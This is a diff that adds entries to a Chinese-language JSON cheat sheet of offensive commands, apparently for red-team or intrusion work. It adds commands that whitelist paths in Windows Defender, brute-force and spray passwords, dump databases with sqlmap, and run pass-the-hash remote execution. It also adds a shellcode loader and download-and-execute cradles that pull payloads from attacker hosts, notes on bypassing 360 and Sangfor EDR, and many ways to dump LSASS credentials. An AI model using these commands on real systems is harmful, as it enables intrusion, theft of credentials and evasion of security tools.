@@ -246,6 +246,30 @@
 						"describe": "通过SSH连接到目标IP，使用端口20020进行登录。"
 					}
 				]
+			},
+			"Defender白名单": {
+				"Windows": [
+					{
+						"command": "tasklist /svc | findstr MsMpEng",
+						"describe": "查找杀软进程"
+					},
+					{
+						"command": "WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\"c:\\ProgramData\"\npowershell Add-MpPreference -ExclusionPath C:\\",
+						"describe": "Defender添加白名单文件夹"
+					},
+					{
+						"command": "WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionProcess=\"chrome.exe\"",
+						"describe": "Defender添加白名单进程"
+					},
+					{
+						"command": "WMIC /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionExtension=\".exe\"",
+						"describe": "Defender添加白名单文件类型"
+					},
+					{
+						"command": "C:\\Windows\\System32\\wbem\\wmic.exe /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get * /format:list | findstr /i \"DisableRealtimeMonitoring ExclusionPath ExclusionProcess MAPSReporting SubmitSamplesConsent\"\nDisableRealtimeMonitoring=FALSE\npowershell \"Get-MpPreference | select ExclusionPath\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\" /s",
+						"describe": "Defender查询白名单列表"
+					}
+				]
 			}
 		},
 		"权限提升": {
@@ -377,6 +401,10 @@
 				{
 					"command": "net config workstation",
 					"describe": "显示当前计算机的域名和配置信息"
+				},
+				{
+					"command": "get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address | Export-Csv c:\\temp\\AD.csv -encoding utf8",
+					"describe": "在域控机器执行,获取机器名字,系统版本,ip地址，最终导出为csv文件"
 				}
 			]
 		},
@@ -2195,6 +2223,138 @@
 	},
 	"常用工具与命令": {
 		"工具命令": {
+			"nmap": {
+				"Windows": [
+					{
+						"command": "nmap -sn 10.11.1.0/24",
+						"describe": "执行无端口扫描的Ping扫描，检查网络中的活动主机。"
+					},
+					{
+						"command": "nmap -sV -p- 10.11.1.0",
+						"describe": "扫描所有端口并尝试检测服务版本。"
+					},
+					{
+						"command": "nmap 10.11.1.0 --script vuln",
+						"describe": "使用内置的漏洞扫描脚本来检查目标主机的已知漏洞。"
+					},
+					{
+						"command": "nmap -p445 10.11.1.0 --script smb-vuln-ms17-010",
+						"describe": "针对端口445执行MS17-010漏洞检查（即永恒之蓝漏洞）。"
+					},
+					{
+						"command": "nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk '{print $5}' | grep -v \"latency).\" > ok_ip.txt",
+						"describe": "执行Ping扫描，跳过DNS解析，采用并行化处理，输出活动主机并保存至ok_ip.txt。"
+					}
+				]
+			},
+			"masscan": {
+				"Windows": [
+					{
+						"command": "masscan 192.168.1.110 -p 1-65535 --rate=1000",
+						"describe": "扫描单个 IP 地址（192.168.1.110）的全部端口（1-65535），扫描速率为 1000。"
+					},
+					{
+						"command": "masscan -iL ip.txt -p1-65535 --rate=1000 -oL port.txt",
+						"describe": "扫描 IP 列表（ip.txt）中的所有 IP 地址，端口范围为 1-65535，速率为 1000，结果保存到 port.txt。"
+					},
+					{
+						"command": "cat port.txt |awk '{print $4\":\"$3}'",
+						"describe": "解析 port.txt 文件，提取 IP:端口 对。"
+					},
+					{
+						"command": "cat p.txt | tr \"\\n\" ,",
+						"describe": "将端口列表转换为 Nmap 可用格式，按逗号分隔。"
+					}
+				]
+			},
+			"dirsearch": {
+				"Windows": [
+					{
+						"command": "python3 dirsearch.py -e php,html,js -u https://target",
+						"describe": "使用 dirsearch 扫描目标 URL https://target，检测扩展名为 php、html、js 的文件。"
+					},
+					{
+						"command": "python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist",
+						"describe": "使用指定的字典文件扫描目标 URL https://target，检测扩展名为 php、html、js 的文件。"
+					},
+					{
+						"command": "python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20",
+						"describe": "扫描目标 URL https://target，检测多种扩展名的文件（php, htm, js, bak, zip, tgz, txt），并设置线程数为20。"
+					},
+					{
+						"command": "python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080",
+						"describe": "通过本地代理（127.0.0.1:8080）扫描目标 URL https://target，检测扩展名为 php、html、js 的文件。"
+					},
+					{
+						"command": "python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080",
+						"describe": "通过 SOCKS5 代理（10.10.0.1:8080）扫描目标 URL https://target，检测扩展名为 php、html、js 的文件。"
+					}
+				]
+			},
+			"sqlmap": {
+				"Windows": [
+					{
+						"command": "python sqlmap.py -u \"http://www.vuln.cn/post.php?id=1\" --proxy \"http://127.0.0.1:1080\"",
+						"describe": "使用代理（127.0.0.1:1080）扫描指定 URL 的 SQL 注入漏洞。"
+					},
+					{
+						"command": "python sqlmap.py -u \"http://www.vuln.cn\" --cookie \"id=11\" --level 2",
+						"describe": "针对指定 URL，使用指定的 cookie 值进行 SQL 注入检测，设置扫描级别为2。"
+					},
+					{
+						"command": "python sqlmap.py -u \"www.xxxx.com/product/detail/id/3*.html\" --dbms=mysql -v 3",
+						"describe": "扫描指定 URL，假设目标数据库为 MySQL，详细日志级别为3。"
+					},
+					{
+						"command": "python sqlmap.py -u \"http://www.vuln.cn/post.php?id=1\" --dbms mysql --dbs",
+						"describe": "扫描指定 URL，假设目标数据库为 MySQL，列出所有数据库。"
+					},
+					{
+						"command": "python sqlmap.py -u \"http://www.vuln.cn/post.php?id=1\" --dbms mysql -D test --tables",
+						"describe": "扫描指定 URL，假设目标数据库为 MySQL，列出数据库 'test' 中的所有表。"
+					},
+					{
+						"command": "python sqlmap.py -u \"http://www.vuln.cn/post.php?id=1\" --dbms mysql -D test -T admin --columns",
+						"describe": "扫描指定 URL，假设目标数据库为 MySQL，列出 'test' 数据库中 'admin' 表的所有列。"
+					},
+					{
+						"command": "python sqlmap.py -u \"http://www.vuln.cn/post.php?id=1\" --dbms mysql -D test -T admin -C \"username,password\" --dump",
+						"describe": "扫描指定 URL，假设目标数据库为 MySQL，导出 'test' 数据库中 'admin' 表的 'username' 和 'password' 列的数据。"
+					},
+					{
+						"command": "python sqlmap.py -r \"c:\\request.txt\" -p id --dbms mysql --file-read=\"e:\\www\\as\\config.php\"",
+						"describe": "使用 request.txt 中的 HTTP 请求，针对 'id' 参数进行 SQL 注入，读取目标文件 'e:\\www\\as\\config.php'。"
+					}
+				]
+			},
+			"hydra": {
+				"Linux": [
+					{
+						"command": "hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql",
+						"describe": "使用指定的用户名字典和密码字典对 10.1.1.10 上的 MySQL 服务进行暴力破解。"
+					},
+					{
+						"command": "hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4",
+						"describe": "使用用户名和密码字典对 10.1.1.10 上的 SSH 服务进行暴力破解，指定端口 22 和任务数 4。"
+					},
+					{
+						"command": "hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv",
+						"describe": "使用指定的用户名和密码字典对 10.1.1.10 上的 MSSQL 服务进行暴力破解，详细日志输出。"
+					},
+					{
+						"command": "hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V",
+						"describe": "使用用户名和密码字典对 10.1.1.10 上的 RDP 服务进行暴力破解，显示攻击日志。"
+					},
+					{
+						"command": "hydra -L /root/user.txt -P pass.txt 10.1.1.10 smb -vV",
+						"describe": "使用指定的用户名和密码字典对 10.1.1.10 上的 SMB 服务进行暴力破解，详细和攻击日志均输出。"
+					},
+					{
+						"command": "hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10",
+						"describe": "使用指定的用户名和密码字典对 10.1.1.10 上的 FTP 服务进行暴力破解。"
+					}
+				]
+			},
 			"wmic": {
 				"wmic远程连接机器": {
 					"Windows": [
@@ -2588,10 +2748,404 @@
 						}
 					]
 				}
+			},
+			"kerbrute": {
+				"域内用户和密码喷洒": {
+					"Windows": [
+						{
+							"command": "kerbrute_windows_amd64.exe userenum --dc 192.168.1.1 -d offensive.local user.txt",
+							"describe": "验证用户存在"
+						},
+						{
+							"command": "kerbrute_windows_amd64.exe passwordspray --dc 192.168.1.1 -d offensive.local user.txt Admin12345",
+							"describe": "喷洒密码"
+						}
+					]
+				}
+			},
+			"secretsdump": {
+				"域内用户hash获取": {
+					"Windows": [
+						{
+							"command": "secretsdump.exe -hashes :c456c606a647ef44b646c44a227917a4 offensive/Administrator@offensive.local -dc-ip 192.168.3.200 -codec=gbk",
+							"describe": "查看域内所有用户hash"
+						},
+						{
+							"command": "secretsdump.exe offensive/Administrator:Admin12345@offensive.local -dc-ip 192.168.3.110 -just-dc-user Administrator",
+							"describe": "查看某个用户hash"
+						}
+					]
+				}
+			},
+			"psexec": {
+				"命令执行": {
+					"Windows": [
+						{
+							"command": "psexec.exe offensive/administrator:Password@@192.168.3.200 \"whoami /user\" -codec=gbk",
+							"describe": "psexec使用账号密码命令执行"
+						},
+						{
+							"command": "psexec.exe -hashes :c456c606a647ef44b646c44a227917a4 ./administrator@192.168.3.200 \"whoami /user\" -codec=gbk",
+							"describe": "psexec使用hash凭据命令执行"
+						}
+					]
+				}
+			},
+			"atexec": {
+				"命令执行": {
+					"Windows": [
+						{
+							"command": "atexec.exe offensive/administrator:Password@@192.168.3.200 \"whoami /user\"",
+							"describe": "atexec使用账号密码命令执行"
+						},
+						{
+							"command": "atexec.exe -hashes :c456c606a647ef44b646c44a227917a4 ./administrator@192.168.3.200 \"whoami /user\"",
+							"describe": "atexec使用hash凭据命令执行"
+						}
+					]
+				}
+			},
+			"wmiexec": {
+				"命令执行": {
+					"Windows": [
+						{
+							"command": "wmiexec.exe offensive/administrator:Password@@192.168.3.200 \"whoami /user\"",
+							"describe": "wmiexec使用账号密码命令执行"
+						},
+						{
+							"command": "wmiexec.exe -hashes :c456c606a647ef44b646c44a227917a4 offensive/administrator@192.168.3.200 \"whoami /user\"",
+							"describe": "wmiexec使用hash凭据命令执行"
+						}
+					]
+				}
+			},
+			"smbexec": {
+				"命令执行": {
+					"Windows": [
+						{
+							"command": "smbexec.exe offensive/administrator:Password@@192.168.3.200",
+							"describe": "smbexec使用账号密码命令执行"
+						},
+						{
+							"command": "smbexec.exe -hashes :c456c606a647ef44b646c44a227917a4 offensive/administrator@192.168.3.200 \"whoami /user\"",
+							"describe": "smbexec使用hash凭据命令执行"
+						}
+					]
+				}
+			},
+			"dcomexec": {
+				"命令执行": {
+					"Windows": [
+						{
+							"command": "dcomexec.exe ./administrator:Password@@192.168.3.200 \"whoami /user\"",
+							"describe": "dcomexec使用账号密码命令执行"
+						},
+						{
+							"command": "dcomexec.exe -hashes :c456c606a647ef44b646c44a227917a4 offensive/administrator@192.168.3.200 \"whoami /user\"",
+							"describe": "dcomexec使用hash凭据命令执行"
+						}
+					]
+				}
+			},
+			"lookupsid": {
+				"查看用户和组": {
+					"Windows": [
+						{
+							"command": "lookupsid.exe offensive/administrator@192.168.3.200 -hashes :c456c606a647ef44b646c44a227917a4",
+							"describe": "lookupsid查看用户和组"
+						}
+					]
+				}
+			},
+			"samrdump": {
+				"查看用户列表和对应uid": {
+					"Windows": [
+						{
+							"command": "samrdump.exe offensive/administrator@192.168.3.200 -hashes :c456c606a647ef44b646c44a227917a4",
+							"describe": "查看用户列表和对应uid"
+						}
+					]
+				}
+			},
+			"微软RCE工具": {
+				"DXCap": {
+					"Windows": [
+						{
+							"command": "cmd /c C:\\ProgramData\\msf.exe              //有一定几率能够绕过360\ncmd /c start C:\\ProgramData\\msf.exe        //有一定几率能够绕过360\nDxcap -c C:\\ProgramData\\msf.exe            //有一定几率能够绕过360\ncmd /c Dxcap -c C:\\ProgramData\\msf.exe     //Dxcap被拦时可尝试这种",
+							"describe": "DXCap.exe 是一个用于图形诊断捕获和播放的命令行工具。 它通过所有功能级别的 Direct3D 11.2 支持 Direct3D 10。"
+						}
+					]
+				},
+				"sqlps": {
+					"Windows": [
+						{
+							"command": "Microsoft SQL Server\\100和110是Powershell v2，120和130是Powershell v4。2016中已由SQLToolsPS.exe替换，但出于兼容性原因将包含在安装中。\nC:\\Program Files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\sqlps.exe\nC:\\Program Files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\sqlps.exe\nC:\\Program Files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\sqlps.exe\nC:\\Program Files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe\nC:\\Program Files (x86)\\Microsoft SQL Server\\140\\Tools\\Binn\\sqlps.exe\nC:\\Program Files (x86)\\Microsoft SQL Server\\150\\Tools\\Binn\\sqlps.exe",
+							"describe": "sqlps.exe是SQL Server附带的一个具有Microsoft签名的二进制文件，用于加载SQL Server cmdlet，Microsoft Visual C#开发，可用ILSpy反编译查看源代码"
+						},
+						{
+							"command": "成功上线，弊端是 sql server 默认为service权限，因此对很多目录包括sql server 默认目录都无法执行该程序，因此要提前上传sqlps至C:\\Users\\Public目录。\n\nSQLPS -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))\"\n\nSQLPS1 -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))\"\ncmd /c SQLPS -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.120/360.ps1'))\"\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Users\\Public\\SQLPS.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(''http://192.168.80.138:80/a''))\"'",
+							"describe": "执行和绕过方法"
+						}
+					]
+				},
+				"fsi": {
+					"Windows": [
+						{
+							"command": "安装Visual Studio时这两个文件并没有被添加至环境变量中，所以需要填写绝对路径或者切换到这个目录下才能执行，路径中带有空格时还要用\"\"C:\\Program Files\\dotnet\\sdk\\[sdk版本]\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe双引号给括起来。\n\nC:\\Program Files\\dotnet\\sdk\\[sdk版本]\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\[vs版本]\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe\n\n如果要将fsi.exe、fsianycpu.exe文件提取出来执行时还需要在当前目录下同时拷贝以下几个文件，否则在执行时会提示缺少FSharp.Core.dll、FSharp.Compiler.Private.dll等文件。\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsiAnyCpu.exe\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\FSharp.Core.dll\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\FSharp.Compiler.Private.dll\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\FSharp.Compiler.Interactive.Settings.dll\nC:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\Microsoft.Build.Utilities.Core",
+							"describe": "fsi.exe、fsianycpu.exe是FSharp解释器，这些具有Microsoft签名的二进制文件包含在Visual Studio中，可用于在命令行下直接执行FSharp脚本（.fsx 或.fsscript）。Fsi.exe在64位的环境中执行，Fsianycpu.exe则使用“机器体系结构来确定是作为32位还是64位进程运行”。"
+						},
+						{
+							"command": "C shellcode：\\xff\\x9d\\x33\nC# shellcode：0xff,0x9d,0x33\nF# shellcode：0xffuy;0x9duy;0x33uy;\n字节格式：0x <十六进制字节> uy；\n字节数组格式：byte[] = [|0xffuy;0x9duy;0xa3uy;|]",
+							"describe": "这里我们需要把生成的C# shellcode转换为F# shellcode，将查找到的“,”替换为“uy;”，“\\r\\n”替换为空，把所有的shellcode放在一行即可。常见的shellcode格式如下。"
+						},
+						{
+							"command": "\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi\" C:\\ProgramData\\SameProcess.fsscript",
+							"describe": "利用代码修改Insert Shellcode Here"
+						},
+						{
+							"command": "open System\nopen System.Runtime.InteropServices\nopen System.Threading\n\n[<DllImport \"kernel32\" >]\nextern nativeint VirtualAlloc(\n  nativeint         lpStartAddress,\n  uint32            dwSize, \n  uint32            flAllocationType, \n  uint32         flProtect)\n\n[<DllImport \"kernel32\" >]\nextern nativeint CreateThread(\n  uint32         lpThreadAttributes,\n  uint32            dwStackSize, \n  nativeint            lpStartAddress, \n  uint32&         param,\n  uint32         dwCreationFlags,\n  uint32&         lpThreadId)\n\n[<DllImport \"kernel32\" >]\nextern nativeint WaitForSingleObject(\n  nativeint         hHandle,\n  uint32         dwMilliseconds)\n\nlet mutable threadId : uint32 = (uint32)0\nlet mutable pInfo : uint32 = (uint32)0\nlet mutable shellcode : byte[] = [|Insert Shellcode Here|]\n\nlet address = VirtualAlloc((nativeint)0, (uint32)shellcode.Length, (uint32)0x1000, (uint32)0x40)\n\nMarshal.Copy(shellcode, 0, address, shellcode.Length)\nlet hThread = CreateThread((uint32)0,(uint32)0, address, &pInfo, (uint32)0, &threadId)\nWaitForSingleObject(hThread, (uint32)0xFFFFFFFF) |> ignore",
+							"describe": "Visual Studio"
+						}
+					]
+				},
+				"cdb": {
+					"Windows": [
+						{
+							"command": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe\nC:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe\n\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.120 LPORT=443 -f c\n由于wds文件中的shellcode是有固定格式的，所以这里我们还需要把生成的C shellcode进行一些处理，分别将查找到的\"、\\x、\\r\\n字符全部替换为空，把所有的shellcode放在一行即可。",
+							"describe": "cdb.exe是Windows调试工具（Debugging Tools）附带的一个具有Microsoft签名的二进制文件，可以调试指定进程，且在指定进程里分配RWX属性内存并写入shellcode，最后执行该内存中的shellcode。"
+						},
+						{
+							"command": "接着再将提取出来的shellcode拷贝到shellcode2wds.py脚本中的buf处，使用python执行这个脚本进行进一步处理，最终生成出执行上线时需要用到的shellcode.wds，py脚本可见文末。\n\n将cdb.exe白名单和刚生成的shellcode.wds一起上传至目标主机的可读写目录中，然后在中国菜刀的虚拟终端执行以下命令后即可得到反弹cmdshell，如遇360时只需加上cmd /c就能绕过。\n\nC:\\ProgramData\\cdb.exe -pd -cf C:\\ProgramData\\shellcode.wds -o notepad.exe",
+							"describe": "流程步骤"
+						},
+						{
+							"command": "import binascii\n\nbuf = \"Insert Shellcode Here\"\n\noutfile = open(\"shellcode.wds\",\"w\")\noutfile.write(\".foreach /pS 5  ( register { .dvalloc 272 } ) { r @$t0 = register }\"+\"\\n\")\nnum = (int)(len(buf)/2)\ncount = 0\n\nfor i in range(num):\n    flag = count%4\n    if flag == 0:\n        outfile.write(\"\\n\")\n    if count < 16:\n        sc_count = \"0\" + hex(count).upper()\n    else:\n        sc_count = hex(count).upper()\n    x = \";eb @$t0+\" + sc_count + \" \" + buf[i*2:i*2+2].upper()\n    count = count + 1\n    x= x.replace(\"0X\",\"\")\n    outfile.write(x)\nextra = num%4\nif extra!=0:\n    for j in range(4-extra):\n        sc_count = hex(count).upper()\n        count = count+1\n        x = \";eb @$t0+\" + sc_count + \" 00\"\n        x = x.replace(\"0X\", \"\")\n        outfile.write(x)\n\noutfile.write(\"\\n\" + \"r @$ip=@$t0\"+\"\\n\")\noutfile.write(\"g\"+\"\\n\")\noutfile.write(\"g\"+\"\\n\")\noutfile.write(\"q\")",
+							"describe": "shellcode2wds.py内容"
+						}
+					]
+				}
+			},
+			"AvDump": {
+				"转储指定进程内存数据": {
+					"Windows": [
+						{
+							"command": "AvDump.exe --pid 980 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp",
+							"describe": "AvDump.exe是Avast杀毒软件中自带的一个程序，可用于转储指定进程（lsass.exe）内存数据"
+						}
+					]
+				}
+			},
+			"sfrdpverify": {
+				"深信服EDR RDP登录绕过": {
+					"Windows": [
+						{
+							"command": "C:\\Program Files\\Sangfor\\EDR\\agent\\bin\\sfrdpverify.exe -> sfrdpverify.exe.bak",
+							"describe": "远程登录保护认证功能是由sfrdpverify进程实现，绕过方法：对sfrdpverify.exe文件进行删除或改名"
+						}
+					]
+				}
+			},
+			"MpCmdRun": {
+				"远程下载文件": {
+					"Windows": [
+						{
+							"command": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.4-0\\MpCmdRun.exe\nC:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.7-0\\MpCmdRun.exe\nC:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\nMpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe\ncopy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url https://attacker.server/beacon.exe -path C:\\Users\\Public\\Downloads\\evil.exe\nMpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe",
+							"describe": "MpCmdRun.exe是Windows Defender自带的命令执行工具，可以用来实现远程下载恶意文件的目的"
+						}
+					]
+				}
+			},
+			"dump lsass": {
+				"procdump": {
+					"Windows": [
+						{
+							"command": "procdump64.exe -accepteula -ma lsass.exe C:\\programdata\\lsass.dmp\nmimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" \"exit\"",
+							"describe": "procdump dump内存存储文件"
+						}
+					]
+				},
+				"sqldumper": {
+					"Windows": [
+						{
+							"command": "tasklist /svc |findstr lsass.exe\nsqldumper.exe [lsass PID] 0 0x01100",
+							"describe": "sqldumper dump内存存储文件方法一"
+						},
+						{
+							"command": "for /f \"tokens=2\" %i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" /NH') do sqldumper.exe %i 0 0x01100",
+							"describe": "sqldumper dump内存存储文件方法二"
+						}
+					]
+				},
+				"avdump64": {
+					"Windows": [
+						{
+							"command": "for /f \"tokens=2\" %i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" /NH') do powershell -c \".\\AvDump_64.exe --pid %i --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file c:\\programdata\\lsass.dmp\"",
+							"describe": "avdump64 dump内存存储文件"
+						}
+					]
+				},
+				"createdump": {
+					"Windows": [
+						{
+							"command": ".net5 下载地址\nhttps://download.visualstudio.microsoft.com/download/pr/f05c10fe-fed3-43b6-b676-ff75021c2d9f/15cab750af61a29d70ef33c265354cf2/dotnet-runtime-5.0.3-win-x64.exe\n安装成功的路径地址\nC:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.3\\createdump.exe\ntasklist /svc | findstr lsass    //查看lsass进程pid\n\nPsExec.exe -s -i -d cmd.exe    //获取system权限\n\n\"C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.3\\createdump.exe\"  -u -f C:\\programdata\\lsass.dmp pid\n\npowershell 可直接获取dmp文件\npowershell -c \".\\createdump.exe -u -f lsass.dmp pid\"",
+							"describe": ".net createdump dump内存存储文件"
+						}
+					]
+				},
+				"comsvcs.dll": {
+					"Windows": [
+						{
+							"command": "powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 808 C:\\programdata\\lsass.dmp full\"",
+							"describe": "comsvcs.dll dump内存存储文件"
+						},
+						{
+							"command": "for /f \"tokens=1,2 delims= \" %A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do powershell -c \"C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump %B lsass.dmp full\"",
+							"describe": "comsvcs.dll dump内存存储文件"
+						}
+					]
+				},
+				"DumpMinitool": {
+					"Windows": [
+						{
+							"command": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\Extensions\\TestPlatform\\Extensions\\DumpMinitool.exe\nfor /f \"tokens=2\" %i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" /NH') do DumpMinitool.exe --file 1.txt --processId %i --dumpType Full",
+							"describe": "Visual Studio 2022自带、微软签名、免杀"
+						}
+					]
+				},
+				"SharpDump": {
+					"Windows": [
+						{
+							"command": "for /f \"tokens:2\" %i in ('tasklist /FI \"IMAGENAME eq lsass.exe\" /NH') do sharpDump.exe %i",
+							"describe": "SharpDump dump内存存储文件"
+						}
+					]
+				},
+				"其他git项目推荐": {
+					"Windows": [
+						{
+							"command": "https://github.com/codewhitesec/HandleKatz\n\nhttps://github.com/post-cyberlabs/Offensive_tools/tree/main/PostDump\n\nhttps://github.com/helpsystems/nanodump\n\nhttps://twitter.com/mrd0x/status/1460597833917251595 dump64.exe\n\nhttps://github.com/itm4n/PPLdump",
+							"describe": "用于dump内存存储文件的github项目"
+						}
+					]
+				}
+			},
+			"移动端": {
+				"adb": {
+					"Windows": [
+						{
+							"command": "adb devices",
+							"describe": "列出所有连接到 ADB 服务器的设备。"
+						},
+						{
+							"command": "adb -s 设备名称 shell env",
+							"describe": "获取设备的环境变量。"
+						},
+						{
+							"command": "adb -s 设备名称 shell pm list packages",
+							"describe": "列出设备上安装的所有软件包。"
+						},
+						{
+							"command": "adb -s 设备名称 shell pm path com.example",
+							"describe": "获取指定软件包的 APK 文件路径。"
+						},
+						{
+							"command": "adb -s 设备名称 pull /data/app/com.example.apk",
+							"describe": "从设备下载 APK 文件到本地。"
+						},
+						{
+							"command": "adb install com.example.apk -s 设备名称",
+							"describe": "在设备上安装 APK 文件。"
+						},
+						{
+							"command": "device=$(adb devices | awk 'NR>1 {print $1}' | fzf) && package=$(adb -s $device shell pm list packages | awk -F\":\" \"{print \\$2}\" | fzf) && adb -s $device pull \"$(adb -s $device shell pm path $package | awk -F\":\" \"{print \\$2}\")\" && mv base.apk \"$package.apk\" &> /dev/null",
+							"describe": "交互式选择并提取 APK 文件。"
+						},
+						{
+							"command": "adb -s 设备名称 logcat",
+							"describe": "输出设备的日志缓冲区。"
+						},
+						{
+							"command": "adb -s 设备名称 uninstall com.example",
+							"describe": "卸载设备上的 APK。"
+						},
+						{
+							"command": "adb -s 设备名称 shell pm clear com.example",
+							"describe": "清除指定应用程序的数据。"
+						},
+						{
+							"command": "adb -s 设备名称 shell am start -n com.example/.MainActivity",
+							"describe": "启动指定的活动（Activity）。"
+						},
+						{
+							"command": "adb -s 设备名称 shell am start -n com.example/.MainActivity -d \"http://example.com\"",
+							"describe": "通过数据 URI 启动活动。"
+						},
+						{
+							"command": "adb -s 设备名称 shell am start -n com.example/.MainActivity -t \"text/plain\"",
+							"describe": "通过 MIME 类型启动活动。"
+						},
+						{
+							"command": "adb -s 设备名称 shell am start -n com.example/.MainActivity -c \"android.intent.category.LAUNCHER\"",
+							"describe": "通过分类启动活动。"
+						},
+						{
+							"command": "adb -s 设备名称 shell am start -n com.example/.MainActivity --es \"key\" \"value\"",
+							"describe": "通过附加参数（extras）启动活动。"
+						},
+						{
+							"command": "adb -s 设备名称 shell am start -n com.example/.MainActivity -f 0x20000000 -d \"http://example.com\" -t \"text/plain\" -c \"android.intent.category.LAUNCHER\" --es \"key\" \"value\"",
+							"describe": "使用标志、数据 URI、MIME 类型、分类和附加参数启动活动。"
+						}
+					]
+				}
+			},
+			"apktool": {
+				"Windows": [
+					{
+						"command": "apktool d com.example.apk",
+						"describe": "反编译 APK 文件。"
+					},
+					{
+						"command": "apktool b com.example",
+						"describe": "重新编译 APK 文件。"
+					},
+					{
+						"command": "uber-apk-signer.jar --apks com.example.apk",
+						"describe": "对 APK 文件进行签名。"
+					},
+					{
+						"command": "objection patchapk -s com.example.apk",
+						"describe": "将 frida-gadget 注入 APK 文件（无 root 环境）。"
+					}
+				]
+			},
